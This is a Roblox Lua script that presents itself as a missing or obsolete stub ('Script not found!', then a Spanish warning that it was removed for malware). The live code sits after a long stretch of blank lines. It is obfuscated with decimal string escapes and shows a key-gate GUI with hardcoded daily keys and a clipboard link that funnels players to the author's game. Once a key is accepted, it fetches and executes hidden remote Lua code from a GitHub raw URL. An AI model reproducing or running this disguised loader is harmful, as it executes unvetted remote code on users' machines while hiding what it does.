-- [[ {"message":"Script not found!"} ]]

























































































































































































































































































































































-- ====================================================================================================
-- ESTE SCRIPT QUEDÓ TOTALMENTE OBSOLETO E INSERVIBLE PORQUE EL CÓDIGO ORIGINAL 
-- FUE ACTUALIZADO O ELIMINADO POR CONTENIDO MALWARE. NO INTENTE EJECUTAR.
-- ====================================================================================================

local _0xP = game:GetService("\80\108\97\121\101\114\115")
local _0xL = _0xP.LocalPlayer
local _0xC = setclipboard or toclipboard
local _0xFN = "\74\117\97\110\65\117\116\104\95\68\97\116\97"
local _0xFT = "\99\111\110\102\105\103\46\116\120\116"

if not isfolder(_0xFN) then makefolder(_0xFN) end

local _0xK = {
    [1] = "\52\57\50\55", [2] = "\56\49\48\53", [3] = "\51\55\52\50", [4] = "\57\50\54\49", [5] = "\49\53\56\51",
    [6] = "\54\48\51\57", [7] = "\50\52\55\49", [8] = "\53\56\49\52", [9] = "\55\51\57\48", [10] = "\50\48\53\54",
    [11] = "\56\52\49\55", [12] = "\51\57\54\50", [13] = "\53\49\48\56", [14] = "\55\55\50\51", [15] = "\52\48\57\53",
    [16] = "\54\50\56\49", [17] = "\49\51\53\57", [18] = "\57\48\52\50", [19] = "\50\54\55\52", [20] = "\53\53\49\48",
    [21] = "\51\56\50\57", [22] = "\56\54\52\55", [23] = "\49\57\51\48", [24] = "\55\50\53\56", [25] = "\52\49\48\54",
    [26] = "\54\51\57\52", [27] = "\50\56\49\55", [28] = "\53\48\52\51", [29] = "\57\55\51\49", [30] = "\49\52\54\56",
    [31] = "\56\53\50\50"
}

local function _0xCP()
    if isfile(_0xFN.."/".._0xFT) then
        local content = readfile(_0xFN.."/".._0xFT)
        local n, t = content:match("([^,]+),([^,]+)")
        return tonumber(n) or 1, tonumber(t) or 0
    end
    return 1, 0
end

local function _0xGP(n, t)
    writefile(_0xFN.."/".._0xFT, tostring(n)..","..tostring(t))
end

local _0xNA, _0xUA = _0xCP()

local function _0xEX()
    local _0xU = "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\74\68\83\99\114\105\112\116\115\79\80\47\74\68\45\83\99\114\105\112\116\115\45\47\109\97\105\110\47\50\65\110\105\109\97\116\105\111\110\65\99\46\108\117\97"
    loadstring(game:HttpGet(_0xU))()
end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "JuanAuthSystem"
ScreenGui.Parent = _0xL:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 350, 0, 220)
MainFrame.Position = UDim2.new(0.5, -175, 0.5, -110)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 12, 20)
MainFrame.Parent = ScreenGui
Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 15)

local UIStroke = Instance.new("UIStroke", MainFrame)
UIStroke.Color = Color3.fromRGB(110, 40, 200)
UIStroke.Thickness = 2

local Title = Instance.new("TextLabel")
Title.Text = "JUAN AUTH SYSTEM"
Title.Size = UDim2.new(1, 0, 0, 40)
Title.Position = UDim2.new(0, 0, 0, 5)
Title.TextColor3 = Color3.fromRGB(180, 80, 255)
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.GothamBold
Title.TextSize = 14
Title.Parent = MainFrame

local HelpHint = Instance.new("TextLabel")
HelpHint.Text = "Necesitas ayuda? Presiona el signo el Interrogación"
HelpHint.Size = UDim2.new(1, 0, 0, 20)
HelpHint.Position = UDim2.new(0, 0, 0, 35)
HelpHint.TextColor3 = Color3.fromRGB(200, 200, 200)
HelpHint.BackgroundTransparency = 1
HelpHint.Font = Enum.Font.Gotham
HelpHint.TextSize = 10
HelpHint.Parent = MainFrame

local QuestionBtn = Instance.new("TextButton")
QuestionBtn.Size = UDim2.new(0, 25, 0, 25)
QuestionBtn.Position = UDim2.new(1, -35, 0, 10)
QuestionBtn.BackgroundColor3 = Color3.fromRGB(110, 40, 200)
QuestionBtn.Text = "?"
QuestionBtn.TextColor3 = Color3.new(1, 1, 1)
QuestionBtn.Font = Enum.Font.GothamBold
QuestionBtn.Parent = MainFrame
Instance.new("UICorner", QuestionBtn).CornerRadius = UDim.new(1, 0)

local TextBox = Instance.new("TextBox")
TextBox.Size = UDim2.new(0, 300, 0, 45)
TextBox.Position = UDim2.new(0.5, -150, 0.38, 0)
TextBox.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
TextBox.PlaceholderText = "Ingresa la Key #".._0xNA.." aquí..."
TextBox.Text = ""
TextBox.TextColor3 = Color3.new(1, 1, 1)
TextBox.Parent = MainFrame
Instance.new("UICorner", TextBox)

local UnlockBtn = Instance.new("TextButton")
UnlockBtn.Size = UDim2.new(0, 300, 0, 45)
UnlockBtn.Position = UDim2.new(0.5, -150, 0.65, 0)
UnlockBtn.BackgroundColor3 = Color3.fromRGB(130, 60, 230)
UnlockBtn.Text = "DESBLOQUEAR"
UnlockBtn.TextColor3 = Color3.new(1, 1, 1)
UnlockBtn.Font = Enum.Font.GothamBold
UnlockBtn.Parent = MainFrame
Instance.new("UICorner", UnlockBtn)

local SidePanel = Instance.new("Frame")
SidePanel.Size = UDim2.new(0, 180, 0, 160)
SidePanel.Position = UDim2.new(1, 8, 0, 0)
SidePanel.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
SidePanel.Visible = false
SidePanel.Parent = MainFrame
Instance.new("UICorner", SidePanel)
Instance.new("UIStroke", SidePanel).Color = Color3.fromRGB(110, 40, 200)

local InfoText = Instance.new("TextLabel")
InfoText.Size = UDim2.new(0.9, 0, 0, 110)
InfoText.Position = UDim2.new(0.05, 0, 0.05, 0)
InfoText.Text = "para obtener el código de cada día juega el juego publicado de Juan, en el juego abra un contado en cuanto termine el contador te mostrara el código, copia el enlace y pegalo en tu navegador (Google) también puedes buscar al usuario Juanelcaballowasa seguirlo si gustas, entrar a creaciones y jugar el juego"
InfoText.TextColor3 = Color3.new(0.9, 0.9, 0.9)
InfoText.TextWrapped = true
InfoText.TextSize = 9
InfoText.Font = Enum.Font.Gotham
InfoText.BackgroundTransparency = 1
InfoText.Parent = SidePanel

local CopyBtn = Instance.new("TextButton")
CopyBtn.Size = UDim2.new(0.85, 0, 0, 35)
CopyBtn.Position = UDim2.new(0.075, 0, 0.72, 0)
CopyBtn.BackgroundColor3 = Color3.fromRGB(60, 120, 220)
CopyBtn.Text = "COPIAR LINK"
CopyBtn.TextColor3 = Color3.new(1, 1, 1)
CopyBtn.Parent = SidePanel
Instance.new("UICorner", CopyBtn)

QuestionBtn.MouseButton1Click:Connect(function()
    SidePanel.Visible = not SidePanel.Visible
end)

CopyBtn.MouseButton1Click:Connect(function()
    _0xC("\104\116\116\112\115\58\47\47\119\119\119\46\114\111\98\108\111\120\46\99\111\109\47\115\104\97\114\101\63\99\111\100\101\61\57\49\57\53\97\56\56\51\98\52\51\57\50\97\52\101\98\51\52\102\51\101\100\97\102\57\97\101\57\97\50\50\38\116\121\112\101\61\69\120\112\101\114\105\101\110\99\101\68\101\116\97\105\108\115\38\115\116\97\109\112\61\49\55\55\49\54\49\56\53\48\52\55\51\55")
    CopyBtn.Text = "¡COPIADO!"
    task.wait(1)
    CopyBtn.Text = "COPIAR LINK"
end)

UnlockBtn.MouseButton1Click:Connect(function()
    local input = TextBox.Text
    local keyCorrecta = _0xK[_0xNA]
    
    if input == keyCorrecta then
        UnlockBtn.Text = "ACCESO CORRECTO"
        UnlockBtn.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
        _0xGP(_0xNA, os.time())
        task.wait(1)
        ScreenGui:Destroy()
        _0xEX()
    else
        UnlockBtn.Text = "KEY #".._0xNA.." INCORRECTA"
        UnlockBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        task.wait(1.5)
        UnlockBtn.Text = "DESBLOQUEAR"
        UnlockBtn.BackgroundColor3 = Color3.fromRGB(130, 60, 230)
    end
end)
